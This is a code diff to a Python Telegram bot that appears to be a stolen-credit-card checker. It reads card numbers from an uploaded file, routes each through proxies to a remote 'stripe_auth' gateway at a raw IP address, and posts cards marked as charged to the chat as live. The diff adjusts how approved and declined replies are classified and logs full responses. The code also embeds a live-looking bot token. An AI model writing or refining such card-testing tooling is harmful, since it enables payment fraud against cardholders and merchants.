@@ -8,7 +8,6 @@ import sys
 
 bot = TeleBot("8663863938:AAGqmVmoRHUdqbFlzsLIg00CG1fQPq1_GJY")
 
-# New API
 GATEWAY = "http://138.128.240.15:8009/stripe_auth?cc="
 
 ADMIN_ID = 7077294261
@@ -173,14 +172,19 @@ def handle_file(m):
             r = requests.get(url, proxies=proxy, timeout=12)
             resp = r.text
 
-            if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
+            print_log(f"Full Response for {card[:8]}****: {resp}")
+
+            if "Your card was declined" in resp:
+                dead += 1
+                print_log(f"DECLINED: {card}")
+            elif "Approved" in resp or any(x in resp.lower() for x in ["charge", "charged", "success", "live"]):
                 live += 1
                 live_cards.append(card)
                 bot.send_message(m.chat.id, f"✅ **1$ Charged - Card Approved**\n{card}")
                 print_log(f"LIVE CARD: {card}")
             else:
                 dead += 1
-                print_log(f"Declined: {card}")
+                print_log(f"UNKNOWN: {card}")
 
         except Exception as e:
             dead += 1
